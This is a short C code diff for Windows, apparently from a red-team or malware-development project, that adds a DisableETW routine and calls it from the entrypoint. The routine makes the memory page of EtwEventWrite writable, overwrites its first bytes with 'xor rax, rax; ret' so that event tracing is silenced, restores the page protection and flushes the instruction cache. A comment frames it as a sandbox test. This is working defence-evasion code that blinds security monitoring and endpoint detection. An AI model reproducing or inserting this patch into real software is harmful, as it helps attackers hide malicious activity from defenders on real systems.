@@ -1,6 +1,6 @@
 #include <windows.h>
 
-#include "objhash.h"
+#include "winapi.h"
 #include "entrypoint.h"
 
 int DisableETW(void) {
@@ -13,19 +13,23 @@ int DisableETW(void) {
 
 	DWORD oldprotect = 0;
 
+    // Set new page protection
 	_ProtectVirtMem((HANDLE)-1,_EtwEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
 
+    // Overwrite ETW Event Write function
 	memcpy(_EtwEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
 
+    // Rollback page permission
+	_ProtectVirtMem((HANDLE)-1,_EtwEventWrite, 4096, oldprotect, &oldprotect);
 
-	VirtualProtect_p(_EtwEventWrite, 4096, oldprotect, &oldprotect);
+    // Flush instruction cache
 	_FlushInstructionCache(-1, _EtwEventWrite, 4096);
 	return 0;
 }
 
 void entrypoint() {
     // ETW Patching to test in sandbox
-    patch_etw();
+    DisableETW();
 
     MessageBoxA(NULL, "ETW Patching applied", "Info", MB_OK);
 }
